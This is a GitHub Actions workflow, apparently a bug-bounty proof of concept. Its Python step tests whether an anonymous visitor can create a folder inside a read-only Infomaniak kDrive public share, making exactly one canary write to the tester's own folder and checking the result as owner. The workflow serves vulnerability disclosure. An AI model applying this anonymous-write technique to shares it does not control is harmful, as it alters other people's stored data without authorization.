name: kDrive public folder one-write canary

on:
  push:
    branches: [main]

permissions:
  contents: read

jobs:
  one-write:
    runs-on: ubuntu-latest
    env:
      KDRIVE_TOKEN: ${{ secrets.KDRIVE_TOKEN }}
    steps:
      - name: Install dependency
        run: python -m pip install --quiet requests

      - name: Attempt exactly one anonymous child-folder creation
        shell: python
        run: |
          import json, os, re, sys, time
          from urllib.parse import urlparse
          import requests

          token=os.environ.get('KDRIVE_TOKEN','')
          if not token: print('[STOP] missing token');sys.exit(2)
          print(f'::add-mask::{token}')

          drive_id=3896576
          folder_id=19
          ua='kDrive-YWH-public-folder-canary/1.0 Infomaniak-YWH-Bugbounty'
          auth={'Authorization':f'Bearer {token}','User-Agent':ua,'Accept':'application/json'}

          # Get only our controlled folder/share metadata as owner.
          meta=requests.get(f'https://api.infomaniak.com/3/drive/{drive_id}/files/{folder_id}',headers=auth,params={'with':'sharelink'},timeout=30)
          try:mo=meta.json()
          except Exception: print(f'[STOP] owner meta HTTP={meta.status_code} non_json');sys.exit(0)
          sd=(mo.get('data') or {}).get('sharelink') or {}
          share_url=sd.get('url') if isinstance(sd,dict) else None
          owner_caps=sd.get('capabilities') if isinstance(sd,dict) else {}
          print(f"[SHARE_POLICY] owner_meta_HTTP={meta.status_code} can_edit={str((owner_caps or {}).get('can_edit')).lower()}")
          if not share_url or (owner_caps or {}).get('can_edit') is not False:
              print('[STOP] expected read-only public share not present');sys.exit(0)
          print(f'::add-mask::{share_url}')

          # Derive public share id from the actual share URL; never print it.
          parts=[p for p in urlparse(share_url).path.split('/') if p]
          try:
              si=parts.index('share'); share_id=parts[si+1]
          except Exception:
              print('[STOP] could not derive public share id from share URL');sys.exit(0)
          print(f'::add-mask::{share_id}')

          public_base=f'https://kdrive.infomaniak.com/3/app/{drive_id}/share/{share_id}'
          print(f'::add-mask::{public_base}')
          public_headers={'User-Agent':ua,'Accept':'application/json'}

          # Gate on current anonymous public capabilities before any write.
          pre=requests.get(f'{public_base}/files/{folder_id}',headers=public_headers,timeout=30)
          try:po=pre.json()
          except Exception: print(f'[STOP] public meta HTTP={pre.status_code} non_json');sys.exit(0)
          pd=po.get('data') or {}; pc=pd.get('capabilities') or {}
          print(f"[PUBLIC_GATE] HTTP={pre.status_code} can_edit={str(pc.get('can_edit')).lower()} can_write={str(pc.get('can_write')).lower()} can_create_directory={str(pc.get('can_create_directory')).lower()} can_upload={str(pc.get('can_upload')).lower()}")
          if not (pre.status_code==200 and pc.get('can_edit') is False and pc.get('can_write') is False and pc.get('can_create_directory') is True):
              print('[STOP] capability mismatch no longer present; no write sent');sys.exit(0)

          # Exactly one anonymous mutation in our own controlled folder.
          canary=f'ywh-anon-create-canary-{int(time.time())}'
          endpoint=f'{public_base}/files/{folder_id}/directory'
          print(f'::add-mask::{endpoint}')
          wr=requests.post(endpoint,
              headers={**public_headers,'Content-Type':'application/json'},
              json={'name':canary,'only_for_me':False},timeout=30)
          print(f'[ANON_CREATE] HTTP={wr.status_code}')
          try:wo=wr.json()
          except Exception:
              print('[ANON_CREATE] non_json=true body_not_printed=true');sys.exit(0)
          we=wo.get('error') or {}; wd=wo.get('data') or {}
          created_id=wd.get('id') if isinstance(wd,dict) else None
          print(f"[ANON_CREATE] result={wo.get('result')} code={we.get('code')} reason={we.get('reason')} created_id={created_id}")

          # Verify effect only through owner-authenticated listing of our controlled folder.
          lst=requests.get(f'https://api.infomaniak.com/3/drive/{drive_id}/files/{folder_id}/files',headers=auth,timeout=30)
          try:lo=lst.json()
          except Exception: print(f'[VERIFY] HTTP={lst.status_code} non_json');sys.exit(0)
          items=lo.get('data') or []
          matches=[x for x in items if isinstance(x,dict) and x.get('name')==canary]
          owner_seen=bool(matches)
          verified_id=(matches[0].get('id') if matches else None)
          print(f'[VERIFY] HTTP={lst.status_code} owner_sees_canary={str(owner_seen).lower()} verified_id={verified_id}')

          if wo.get('result')=='success' and owner_seen:
              print('[RESULT] ANONYMOUS_CREATE_CONFIRMED_IN_CAN_EDIT_FALSE_PUBLIC_FOLDER')
          else:
              print('[RESULT] ANONYMOUS_CREATE_NOT_CONFIRMED')
